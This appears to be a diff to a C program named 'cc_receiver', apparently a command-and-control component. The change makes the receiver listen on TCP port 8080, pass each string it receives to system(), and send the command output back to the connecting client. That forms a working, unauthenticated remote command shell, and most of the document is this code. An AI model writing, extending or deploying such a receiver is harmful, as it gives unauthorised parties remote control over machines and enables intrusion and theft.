@@ -1,8 +1,59 @@
 #include "cc_receiver.h"
 
-void execute_command(char *cmd) {
-    // Execute the received command using system()
-    system(cmd);
+#define MAX_CMD_SIZE 1024
+#define PORT 8080
+
+
+void execute_command(int socket, char *cmd) {
+    int pipefd[2];
+    pid_t pid;
+
+    // Create a pipe
+    if (pipe(pipefd) == -1) {
+        perror("pipe");
+        return;
+    }
+
+    // Fork a new process
+    pid = fork();
+    if (pid == -1) {
+        perror("fork");
+        return;
+    }
+
+    if (pid == 0) {  // Child process
+        // Close the read end of the pipe
+        close(pipefd[0]);
+
+        // Redirect stdout to the write end of the pipe
+        dup2(pipefd[1], STDOUT_FILENO);
+
+        // Execute the command
+        int ret = system(cmd);
+        if (ret != 0) {
+            write(pipefd[1], "Command not found or failed to execute", 39);
+        }
+
+        // Close the write end of the pipe
+        close(pipefd[1]);
+        exit(0);
+    } else {  // Parent process
+        char buffer[1024] = {0};
+
+        // Close the write end of the pipe
+        close(pipefd[1]);
+
+        // Read from the pipe and send the output to the client
+        ssize_t bytesRead;
+        while ((bytesRead = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
+            buffer[bytesRead] = '\0';  // Null-terminate the string
+            send(socket, buffer, strlen(buffer), 0);
+            memset(buffer, 0, sizeof(buffer));  // Clear the buffer
+        }
+
+        // Close the read end of the pipe
+        close(pipefd[0]);
+    }
 }
 
 int start_receiver() {
@@ -46,17 +97,30 @@ int start_receiver() {
         return EXIT_FAILURE;
     }
 
+
     // Main loop to receive commands
     while (1) {
-        read(new_socket, buffer, MAX_CMD_SIZE);
+        ssize_t bytesRead = read(new_socket, buffer, MAX_CMD_SIZE);
+        if (bytesRead <= 0) {
+            perror("Client disconnected or read error");
+            break;
+        }
+        buffer[bytesRead] = '\0';  // Null-terminate the string
         printf("Received command: %s\n", buffer);
 
-        // Execute the received command
-        execute_command(buffer);
+        // Check for empty or invalid command
+        if (strlen(buffer) == 0) {
+            continue;
+        }
 
-        // Clear the buffer
-        memset(buffer, 0, MAX_CMD_SIZE);
+        // Execute the received command and send back the output
+        execute_command(new_socket, buffer);
     }
 
+    close(new_socket);
     return EXIT_SUCCESS;
+}
+
+int main() {
+    return start_receiver();
 }
